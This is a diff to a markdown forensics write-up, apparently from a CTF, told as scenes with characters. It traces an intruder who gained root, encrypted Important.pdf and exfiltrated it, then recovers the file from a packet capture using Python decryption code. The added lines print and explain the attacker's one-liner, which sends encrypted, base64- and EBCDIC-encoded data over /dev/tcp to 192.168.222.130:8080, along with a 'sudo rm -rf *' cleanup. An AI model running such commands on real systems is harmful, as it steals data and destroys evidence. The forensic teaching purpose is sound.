@@ -575,131 +575,9 @@ Knowing the timezone, we can convert connection timestamps to UTC.
 
 ---
 
-### Scene 3: The Encryption Key
+### Scene 3: The Command History
 
-_A terminal window displays the OpenSSL command used by the attacker._
-
-**Mona** [leaning forward]:  
-"Look at this encryption command. AES-256-CBC."
-
-_She highlights the parameters:_
-
-```
-iv: 4fa17640b7dfe8799f072c65b15f581d
-key: 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d
-```
-
-**John**:  
-"They encrypted something called 'data.zip'..."
-
----
-
-### Scene 4: The Missing Files
-
-_Mona pulls up the file operations log._
-
-**Mona**:  
-"They went straight for johnnycage's Documents folder."
-
-_She displays the sequence:_
-
-```
-08:02:21 - Moved: Important.pdf
-08:02:54 - Encrypted: data.zip
-08:03:01 - Deleted: Both files
-```
-
-**Thomas** [grimly]:  
-"First they take, then they clean."
-
----
-
-### Scene 5: The Connection
-
-_A whiteboard shows a diagram connecting all events from previous episodes._
-
-**Mona**:  
-"The XSL exploit from Episode 3, the timezone manipulation we found... it was all leading to this moment."
-
-**Marcos**:  
-"A perfectly choreographed attack."
-
----
-
-### Scene 6: The IP Address
-
-_Mona zooms in on the connection details._
-
-**Mona**:  
-"192.168.222.130 - Our ghost has an address."
-
-_She brings up the SSH connection log:_
-
-```
-Accepted publickey for nginx from 192.168.222.130 port 43302
-```
-
----
-
-### Scene 7: The Root Access
-
-_The team examines the privilege escalation sequence._
-
-**Thomas**:  
-"They didn't just create a user... they gave it sudo access immediately."
-
-**Mona** [nodding]:  
-"And look at the timing:"
-
-```
-08:00:13 - User nginx created
-08:00:13 - Added to sudo group
-08:00:59 - Switched to root
-```
-
----
-
-### Scene 8: The Decryption Attempt
-
-_Mona starts working on breaking the encryption._
-
-**Mona**:  
-"They used AES-256... but they left us both the IV and the key."
-
-_Her fingers fly across the keyboard:_
-
-```
-openssl enc -d -aes-256-cbc \
--iv 4fa17640b7dfe8799f072c65b15f581d \
--K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d
-```
-
----
-
-### Scene 9: The Discovery
-
-_A realization dawns on Mona's face as she examines the encryption parameters._
-
-**Mona**:  
-"This key... it's not random."
-
-_She starts breaking down the hex string:_
-
-```
-3cabc6db78a034f69f16aa8986cf2e2c
-ea05713b1e95ff9b2d80f6a71ae76b7d
-```
-
-**Mona** [with growing excitement]:  
-"It's a message. They want us to decode something else entirely."
-
-_The screen flickers as she begins a new analysis._
-
-## Episode 6: Command and Control
-
-### Scene 1: The Command History
-
-_Mona opens a new terminal window, displaying the contents of .bash_history._
+_Mona opens a new terminal window, displaying the contents of `.bash_history` file located in `/var/www/`_
 
 **Mona**:  
 "Found their footprints."
@@ -711,36 +589,15 @@ whoami
 cd /opt/splunk/bin/scripts/
 sudo rm -rf search.sh
 sudo su
+cd /home/johnnycage/
+sudo mv /home/johnnycage/Documents/Important.pdf .
+zip data.zip *
+sudo openssl enc -aes-256-cbc -iv $(cut -c 1-32 <<< $(uname -r | md5sum)) -K $(cut -c 1-64 <<< $(date +%s | sha256sum)) -in data.zip | base64 | dd conv=ebcdic > /dev/tcp/192.168.222.130/8080
+sudo rm -rf *
 ```
 
 **Thomas**:  
 "Classic reconnaissance pattern."
-
----
-
-### Scene 2: The File Trail
-
-_Multiple screens show file operations and directory structures._
-
-**Marcos** [pointing]:  
-"Look at their movement pattern..."
-
-**Mona**:  
-"They went straight for johnnycage's documents. Just like we saw in the logs."
-
-_She highlights the commands:_
-
-```bash
-cd /home/johnnycage/
-sudo mv /home/johnnycage/Documents/Important.pdf .
-zip data.zip *
-```
-
----
-
-### Scene 3: The Encryption Chain
-
-_Mona analyzes the complex encryption command._
 
 **Mona** [eyes widening]:  
 "This is beautiful... in a terrifying way."
@@ -759,6 +616,28 @@ sudo openssl enc -aes-256-cbc \
 **Mona**:  
 "The kernel version for the IV... system time for the key..."
 
+**Marcos** [pointing]:  
+"Look at their movement pattern..."
+
+**Mona**:  
+"They went straight for johnnycage's documents. Just like we saw in the logs."
+
+**John**:  
+"They encrypted something called 'data.zip'..."
+
+From the `.bash_history` and `auth.log`, we observe that the attacker:
+
+1. Accessed elevated privileges using `su` and `sudo`.
+2. Moved, encrypted, and attempted to exfiltrate `Important.pdf` to an external server.
+3. Cleaned up evidence using `rm` commands on sensitive files.
+
+Finally, using the known `iv` and `key` from point 10 in the logs:
+
+```plaintext
+iv 4fa17640b7dfe8799f072c65b15f581d
+-K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d
+```
+
 ---
 
 ### Scene 4: The Exfiltration Route
@@ -774,27 +653,173 @@ _A network diagram appears, showing the data's path._
 **Mona**:  
 "Like nesting dolls of obfuscation."
 
----
+**Marcos**:  
+"A perfectly choreographed attack."
 
-### Scene 5: The Clean-Up
+**Mona**: "Let put this all together"
 
-_The final command glows ominously on the screen._
+The following command line demonstrates a multi-step operation using several tools—`openssl`, `cut`, `uname`, `md5sum`, `sha256sum`, `date`, `base64`, and `dd`. Here’s a detailed breakdown:
 
 ```bash
-sudo rm -rf *
+sudo openssl enc -aes-256-cbc -iv $(cut -c 1-32 <<< $(uname -r | md5sum)) -K $(cut -c 1-64 <<< $(date +%s | sha256sum)) -in data.zip | base64 | dd conv=ebcdic > /dev/tcp/192.168.222.130/8080
 ```
 
-**Marcos**:  
-"They tried to leave no trace..."
+#### Explanation of Each Step
 
-**Mona** [smiling]:  
-"Except they did. In the very commands they used to hide."
+1. **Superuser Privilege**:
+
+   - `sudo`: Runs the command as a superuser, providing necessary permissions for access and encryption.
+
+2. **Encryption with OpenSSL**:
+
+   - `openssl enc -aes-256-cbc`: Encrypts data using the AES-256 algorithm in CBC (Cipher Block Chaining) mode.
+   - `-iv $(cut -c 1-32 <<< $(uname -r | md5sum))`: Generates a 32-character (128-bit) initialization vector (IV) for encryption:
+     - `uname -r` outputs the kernel version.
+     - `md5sum` hashes this kernel version, creating a unique MD5 hash.
+     - `cut -c 1-32` extracts the first 32 characters from this hash, producing the IV.
+   - `-K $(cut -c 1-64 <<< $(date +%s | sha256sum))`: Specifies the encryption key:
+     - `date +%s` outputs the current Unix timestamp (seconds since January 1, 1970).
+     - `sha256sum` hashes the timestamp, creating a unique 64-character SHA-256 hash.
+     - `cut -c 1-64` takes the full 64 characters, forming a 256-bit encryption key.
+   - `-in data.zip`: Specifies `data.zip` as the input file for encryption.
+
+   The result of this part is encrypted data from `data.zip`.
+
+3. **Encoding to Base64**:
+
+   - `| base64`: The pipe `|` passes the encrypted output from `openssl` to `base64`.
+   - `base64`: Encodes the encrypted data into Base64, converting binary data into text to facilitate transmission.
+
+4. **Converting to EBCDIC Encoding**:
+
+   - `| dd conv=ebcdic`: The pipe `|` sends the Base64-encoded data to `dd`.
+   - `dd conv=ebcdic`: Converts the data from ASCII (default) encoding to EBCDIC (Extended Binary Coded Decimal Interchange Code), a character encoding system typically used on IBM mainframes.
+
+5. **Transmitting Encrypted Data via TCP**:
+   - `> /dev/tcp/192.168.222.130/8080`: Redirects the final encrypted, Base64-encoded, and EBCDIC-encoded data to a TCP connection targeting IP address `192.168.222.130` on port `8080`.
 
 ---
 
-## Episode 7: Digital Archaeology
+### Scene 6: The IP Address
 
-### Scene 1: The Decryption Lab
+_Mona zooms in on the connection details._
+
+**Mona**:  
+"192.168.222.130 - Our ghost has an address."
+
+_She brings up the SSH connection log:_
+
+```
+Accepted publickey for nginx from 192.168.222.130 port 43302
+```
+
+**Thomas**:  
+"we can search network traffic and then recover the file exfiltrated."
+
+---
+
+## Episode 6: Digital Archaeology
+
+### Scene 1: The Network Capture
+
+_Thomas pulls up network traffic logs._
+
+**Thomas**:  
+"Got the EBCDIC-encoded transmission. Port 8080, just like in the command."
+
+**Mona**:  
+"Now we reverse their Russian doll encryption..."
+
+**Mona**:  
+"This Python script is designed to extract raw TCP data from a pcap file, convert it from EBCDIC to ASCII, decode it from Base64, and decrypt it using OpenSSL."
+
+#### Step 1: Extracting Raw TCP Data
+
+The script below reads packets from a specified pcap file, filters them based on IP and port conditions, orders them by TCP sequence, and then assembles the data in the correct sequence.
+
+```python
+from scapy.all import rdpcap, TCP, IP, Raw
+
+def extract_tcp_data(pcap_file):
+    """Extracts raw data from TCP packets matching filter conditions"""
+    packets = rdpcap(pcap_file)
+    assembled_data = b""
+
+    print(f"\nAnalyzing {len(packets)} packets from {pcap_file}...")
+
+    # Sort packets by sequence number to ensure correct order
+    data_packets = []
+    for packet in packets:
+        if (packet.haslayer(TCP) and packet.haslayer(IP) and packet.haslayer(Raw) and
+            packet[IP].src == '192.168.222.145' and
+            packet[TCP].sport == 36568 and
+            packet[IP].dst == '192.168.222.130' and
+            packet[TCP].dport == 8080):
+            data_packets.append(packet)
+
+    # Sort by TCP sequence
+    data_packets.sort(key=lambda p: p[TCP].seq)
+
+    # Combine packet data
+    for packet in data_packets:
+        assembled_data += packet[Raw].load
+
+    return assembled_data
+```
+
+#### Step 2: Convert from EBCDIC to ASCII
+
+Using IBM's EBCDIC encoding (`cp037`), convert the raw data to ASCII format.
+
+```python
+import codecs
+
+ascii_data = codecs.decode(assembled_data, 'cp037')
+```
+
+#### Step 3: Decode Base64 Data
+
+Next, decode the ASCII data from Base64.
+
+```python
+import base64
+
+decoded_data = base64.b64decode(ascii_data)
+```
+
+#### Step 4: Decrypt with OpenSSL
+
+With known `iv` and `key` values, use OpenSSL to decrypt the file:
+
+```python
+import subprocess
+
+iv = "4fa17640b7dfe8799f072c65b15f581d"
+key = "3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d"
+
+def decrypt_data():
+    cmd = [
+        'openssl', 'enc', '-d', '-aes-256-cbc',
+        '-iv', iv,
+        '-K', key,
+        '-in', 'temp_encrypted.bin',
+        '-out', 'decrypted.zip'
+    ]
+
+    print("\nExecuting OpenSSL command:")
+    print(' '.join(cmd))
+
+    result = subprocess.run(cmd, capture_output=True, text=True)
+    if result.returncode == 0:
+        print("Successfully decrypted to decrypted.zip")
+        return True
+    else:
+        print("Decryption failed:")
+        print(result.stderr)
+        return False
+```
+
+### Scene 2: The Decryption Lab
 
 _The team has set up a specialized workstation for data recovery. Multiple servers hum in the background._
 
@@ -810,46 +835,33 @@ Key: 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d
 
 ---
 
-### Scene 2: The Network Capture
-
-_Thomas pulls up network traffic logs._
-
-**Thomas**:  
-"Got the EBCDIC-encoded transmission. Port 8080, just like in the command."
-
-**Mona**:  
-"Now we reverse their Russian doll encryption..."
-
----
-
 ### Scene 3: The Decryption Process
 
-_Mona's fingers fly across the keyboard as she constructs the reverse process._
+_Mona's fingers fly across the keyboard as she runs the reverse process._
 
 **Mona**:  
-"First, convert from EBCDIC back to ASCII..."
+"First, convert from EBCDIC back to ASCII then decode to Base64 and we will have a .zip"
 
 _She types commands:_
 
-```bash
-dd conv=ascii < captured_data | \
-base64 -d | \
-openssl enc -d -aes-256-cbc \
--iv 4fa17640b7dfe8799f072c65b15f581d \
--K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d
+```
+Analyzing 1427 packets from capture.pcapng...
+Extracted 103813 bytes of raw data
+Converted EBCDIC to ASCII
+Decoded Base64 data
+Executing OpenSSL command:
+openssl enc -d -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in temp_encrypted.bin -out decrypted.zip
+Successfully decrypted to decrypted.zip
 ```
 
----
+**Mona**:  
+"Now we can unzip `decrypted.zip` to obtain the exfiltrated file."
 
-### Scene 4: The Breakthrough
-
-_A progress bar fills as the decryption processes._
-
-**Thomas**:  
-"ZIP file structure detected!"
-
-**Mona** [focused]:  
-"The encryption peels away like layers of an onion..."
+```
+unzip decrypted.zip
+Archive:  decrypted.zip
+  inflating: Important.pdf
+```
 
 ---
 
@@ -880,16 +892,13 @@ _Her screen fills with hexadecimal values._
 **Mona** [leaning closer]:  
 "A message... and coordinates?"
 
----
-
-### Scene 7: The Next Lead
-
-_The team gathers around Mona's main screen._
+**Marcos**:  
+"Can we open it ?"
 
 **Mona**:  
-"The file wasn't the target... it was the messenger."
+"Let's see"
 
-_She brings up a map with the extracted coordinates._
+**John**:  
+"This is my file they have it "
 
-**Mona**:  
-"And now we know where they're going next."
+![Alt text](/images/file_fragility.png "Optional Title")
